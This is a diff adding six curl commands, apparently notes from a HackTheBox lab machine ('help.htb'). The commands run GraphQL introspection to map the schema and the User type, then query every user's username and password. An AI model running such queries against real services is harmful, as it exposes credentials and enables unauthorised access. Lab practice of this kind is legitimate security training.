@@ -1,0 +1,6 @@
+curl -s http://help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { queryType { name, fields {name, description} }}}"}' | jq .
+curl -s http://help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { queryType { name, fields {name, description} }}}"}' | jq -c .
+curl -s http://help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types {name} }}"}' | jq -c .
+curl -s http://help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __schema { types {name} }}"}' | jq .
+curl -s http://help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ __type(name: \"User\") {name fields {name}}}"}' | jq 
+curl -s http://help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{user {username password} }"}' | jq .
